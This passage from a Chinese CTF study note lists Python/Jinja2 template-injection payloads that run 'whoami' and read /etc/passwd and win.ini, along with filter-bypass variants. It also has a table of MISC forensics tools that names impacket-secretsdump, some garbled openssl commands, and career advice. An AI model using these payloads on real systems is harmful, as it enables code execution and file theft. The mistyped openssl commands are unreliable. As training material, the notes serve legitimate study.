[].__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([str(().__class__)[4],str(().__class__.__new__)[29],str(().__class__)[4],str(().__class__.__new__)[5],str(().__class__.__new__)[11],str(().__class__.__new__)[10]])](str().join([str(().__class__)[4],str(().__class__.__new__)[13]]))

# 0x01 利用eval()将其中字符串作为代码执行  
{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}


{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

# 0x02 直接调用__import__()构造payload执行命令
{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}

# 0x03 调用open()读取文件
{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['open']('C:\\Windows\win.ini').read()}}

{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('whoami').read()}}

{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
 
{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}

"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']("whoami").read()

{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
```

### <font style="color:rgb(51, 51, 51);">继承关系替换</font>
```plain
# __globals__ 替换
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals
''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")

# __mro__、__bases__、__base__互换
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base__
{}.__class__.__base__
```

### <font style="color:rgb(51, 51, 51);">leak部分</font>
```plain
dir() 查看所有属性和方法
dir(__builtins__) 查看所有内建函数
__dict__ 查看内部所有属性名和属性值组成的字典
getattr来拿到目标方法。
locals() 返回所有局部变量的函数；
__main__ 本身
__file__ 代码本身路径

globals() 返回所有全局变量的函数；
vars() 返回所有全局变量的函数；
help() 
__main__

breakpoint()
pdb()
```



---
## <font style="color:rgb(51, 51, 51);">杂类文件类型题总结</font>
### 杂类文件类型以及对应解法
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">分析工具</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** |
| --- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">未知</font> | <font style="color:rgb(51, 51, 51);">tird</font> | <font style="color:rgb(51, 51, 51);">tird.exe 输入文件</font> |
| | <font style="color:rgb(51, 51, 51);">xortool</font> | <font style="color:rgb(51, 51, 51);"></font> |
| 可能为raw文件或者加密文件，可以尝试导入 audilatiy 或者 GIMP中 | <font style="color:rgb(51, 51, 51);"></font> | <font style="color:rgb(51, 51, 51);"></font> |
| <font style="color:rgb(51, 51, 51);">bin</font> | <font style="color:rgb(51, 51, 51);">RouterPassView/ext2</font> | |
| <font style="color:rgb(51, 51, 51);">swf</font> | <font style="color:rgb(51, 51, 51);">potplayer</font> | |
| <font style="color:rgb(51, 51, 51);">pst</font> | <font style="color:rgb(51, 51, 51);">DATA forensicspst forensics</font> | |
| | <font style="color:rgb(51, 51, 51);">JPEXS flash 逆向器</font> | |
| <font style="color:rgb(51, 51, 51);">eml</font> | <font style="color:rgb(51, 51, 51);">outlook导入文件（邮件）</font> | |
| <font style="color:rgb(51, 51, 51);">rdp缓存文件</font> | <font style="color:rgb(51, 51, 51);">python bmc-tools.py</font> | |
| <font style="color:rgb(51, 51, 51);">exe</font> | <font style="color:rgb(51, 51, 51);">pyinstxtractor</font> | <font style="color:rgb(51, 51, 51);">python pyinstxtractor.py 目标文件.exe</font> |
| <font style="color:rgb(51, 51, 51);">pyc</font> | <font style="color:rgb(51, 51, 51);">uncompyle</font> | <font style="color:rgb(51, 51, 51);">uncompyle6 -o 输出文件 输入文件</font><br/><font style="color:rgb(51, 51, 51);">uncompyle6 -o output.py input.pyc</font> |
| | <font style="color:rgb(51, 51, 51);">EasyPythonDecompiler</font> | |
| | <font style="color:rgb(51, 51, 51);">stegosaurus-master</font> | <font style="color:rgb(51, 51, 51);">分析指令：</font><br/><font style="color:rgb(51, 51, 51);">python -m stegosaurus encode.py -r</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">加密指令：</font><br/><font style="color:rgb(51, 51, 51);">python -m stegosaurus encode.py -s --payload "flagtext"</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密指令：</font><br/><font style="color:rgb(51, 51, 51);">python -m stegosaurus -x flag.pyc</font> |
| | <font style="color:rgb(51, 51, 51);">pyinstxtractor</font> | <font style="color:rgb(51, 51, 51);">python pyinstxtractor 输入文件python pyinstxtractor inputfile</font> |
| <font style="color:rgb(51, 51, 51);">key,pcm</font> | <font style="color:rgb(51, 51, 51);">openssl</font> | <font style="color:rgb(51, 51, 51);">生成密钥：</font><br/><font style="color:rgb(51, 51, 51);">openssl genrsa -out test.key q 1024 1024</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">为密钥长度提取密钥：</font><br/><font style="color:rgb(51, 51, 51);">-openssl rsaa -in test.key -pubout -out test_pub.key</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">公钥加密文件：</font><br/><font style="color:rgb(51, 51, 51);">openssl rsaut; --encrypt -in hello -inkey test_pub.key -pubin -out out.txt</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密文件：</font><br/><font style="color:rgb(51, 51, 51);">openssl -rsatul -decrypt -in flag.txt -inkey test,key -out out.txt</font> |
| <font style="color:rgb(51, 51, 51);">logicdata，saleae</font> | <font style="color:rgb(51, 51, 51);">sakeae logic逻辑分析工具</font> | |
| <font style="color:rgb(51, 51, 51);">文言文代码</font> | <font style="color:rgb(51, 51, 51);">文言 online ide</font> | |
| | | |
| <font style="color:rgb(51, 51, 51);">odttf</font> | <font style="color:rgb(51, 51, 51);">字体</font> | <font style="color:rgb(51, 51, 51);">odttf2ttf ( odttf名字需要改成对应的key，fontlab.xml中有)</font> |
| <font style="color:rgb(51, 51, 51);">ttf</font> | <font style="color:rgb(51, 51, 51);">字体</font> | <font style="color:rgb(51, 51, 51);">fontdrop!查看字体文件</font> |
| <font style="color:rgb(51, 51, 51);">绘制图片</font> | <font style="color:rgb(51, 51, 51);">gnuplot</font> | <font style="color:rgb(51, 51, 51);">gnuplot plot "文件名字"gnuplot plot inputfile</font> |
| <font style="color:rgb(51, 51, 51);">GAGGP 绘图</font> | <font style="color:rgb(51, 51, 51);">GPS Visualizer</font> | |
| <font style="color:rgb(51, 51, 51);">GCODE</font> | | |
| <font style="color:rgb(51, 51, 51);">UT Dallas</font> | | |
| <font style="color:rgb(51, 51, 51);">ntds</font> | <font style="color:rgb(51, 51, 51);">渗透域</font> | <font style="color:rgb(51, 51, 51);">impacket-secretsdump</font> |
| <font style="color:rgb(51, 51, 51);">hc</font> | <font style="color:rgb(51, 51, 51);">VareCryptTrueCrypt</font> | <font style="color:rgb(51, 51, 51);">veracrypt解密FTK挂载R-studio扫描</font> |


### <font style="color:rgb(51, 51, 51);">二维码类题型</font>
#### <font style="color:rgb(51, 51, 51);">二维码组成</font>
![](https://cdn.nlark.com/yuque/0/2022/png/155952/1663935696703-3736ec0f-adb1-46a8-88a2-8f2fa1999e81.png?x-oss-process=image%2Fresize%2Cw_750%2Climit_0)

#### <font style="color:rgb(51, 51, 51);">修改二维码纠错等级/掩码</font>
<font style="color:rgb(51, 51, 51);">QrazyBox离线版</font>

#### <font style="color:rgb(51, 51, 51);">填充二维码纠错区</font>
<font style="color:rgb(51, 51, 51);">QrazyBox离线版</font>

#### <font style="color:rgb(51, 51, 51);">lmhq排列</font>
<font style="color:rgb(51, 51, 51);">QrazyBox离线版</font>

![](https://ihk-one.top/?flag=flag{you_find_it!})
## 感悟
  大一新生入门网安，如果学校一队二队缺 WEB 手，推荐学习 WEB 入门。
  不要因为 MISC 简单而在这浪费了大把时间。因为到了大三大四找实习你会发现 MISC 知识除了只能去一些公司的竞赛部门出题和培训（甚至就几个公司，很多公司的竞赛部门已经解散了，大概率以后找不到工作的），对实战技术一点提升也没有，干了几年想要干别的工作不可能了（别说你愿意工作后学习，上下班到家就歇逼了）。
  如果学校一队二队不缺 WEB，那么你可以尝试看看 MISC ，因为要多混些比赛经历好写简历。MISC 入门最简单，纯脑洞没啥门槛，基本就是工具 + python 能力，看到对应文件类型和特征照着上面表找工具就行了，学一下 cv2，Image，numpy，zipfile，pyzbar，matplotlib 之类的库，多刷刷 ctfshow 入门 + NSSCTF 提高。然后就转 WEB，MISC 只是用来当作你跟着 WEB 和 PWN 手混比赛的手段而已。努力学学 WEB 或者实战的渗透。
  当然我也找不到啥工作，就不指指点点了，只是给大一新生说说自己作为 MISC 手的想法。
